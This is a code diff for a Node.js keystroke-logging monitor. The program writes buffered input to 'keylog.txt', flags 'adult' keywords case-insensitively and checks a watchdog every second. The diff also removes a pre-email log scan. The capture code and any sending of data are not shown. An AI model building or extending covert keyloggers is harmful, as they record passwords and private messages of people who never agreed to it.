@@ -13,13 +13,14 @@ function loadKeywords() {
     const content = fs.readFileSync(keywordsFilePath, 'utf-8');
     return content.split(/\r?\n/).filter(Boolean);  // Split by line, remove empty lines
 }
-
+  
 let keywords = loadKeywords();  // Load keywords initially
 
 // Function to scan buffer for adult keywords
 function scanForAdultKeywords(bufferContent) {
+    const lowerCaseBuffer = bufferContent.toLowerCase();  // Convert the buffer content to lowercase
     for (const keyword of keywords) {
-        if (bufferContent.includes(keyword)) {
+        if (lowerCaseBuffer.includes(keyword.toLowerCase())) {  // Compare with lowercased keywords
             logToKeylogFile(`[WARNING] Adult content detected: "${keyword}"`);
             break;
         }
@@ -34,27 +35,12 @@ function cleanBuffer(bufferContent) {
     return cleanedBuffer.replace(/\s+/g, ' ').trim();
 }
 
-// Function to scan the entire keylog file for adult keywords
-function scanLogFileBeforeEmail() {
-    const logContent = fs.readFileSync(keylogFilePath, 'utf-8');
-    for (const keyword of keywords) {
-        if (logContent.includes(keyword)) {
-            logToKeylogFile(`[WARNING] Detected adult keyword in keylog: "${keyword}"`);
-        }
-    }
-}
-
-// Call this function before sending the email report
-function sendEmailReport() {
-    scanLogFileBeforeEmail();
-}
-
-// Log termination to the keylog.txt file
+// Log messages to keylog.txt
 function logToKeylogFile(message) {
     const timestamp = new Date().toLocaleString();
     const logMessage = `\n${timestamp} - ${message}\n`;
-    fs.appendFileSync('keylog.txt', logMessage);
-  }
+    fs.appendFileSync(keylogFilePath, logMessage);
+}
 
 let wasRunning = false; // Tracks if the watchdog was running in the last check
 
@@ -115,14 +101,14 @@ function startWatchdog() {
   }
 
   
-  // Check the status every 5 seconds
+  // Check the status every 1 second
   setInterval(checkWatchdogStatus, 1000);
   
   // Initial check
   checkWatchdogStatus();
 
 // Create a write stream for the key log file
-const logStream = fs.createWriteStream('keylog.txt', { flags: 'a' });
+const logStream = fs.createWriteStream(keylogFilePath, { flags: 'a' });
 
 // Function to get the current date
 function getCurrentDate() {
@@ -143,9 +129,6 @@ function writeBufferToFile() {
     }
 }
 
-function reloadKeywords() {
-    keywords = loadKeywords();
-}
 
 // Function to check if the log file needs a newline before writing the date
 function ensureNewlineBeforeDate() {
@@ -155,7 +138,7 @@ function ensureNewlineBeforeDate() {
         const lastChar = fileContent.slice(-1);
         
         // Check if the last character is not a newline
-        if (lastChar !== '\n') {
+        if (fileContent.length > 0 && lastChar !== '\n') {
             logStream.write('\n'); // Add a newline if it's missing
         }
     } catch (error) {
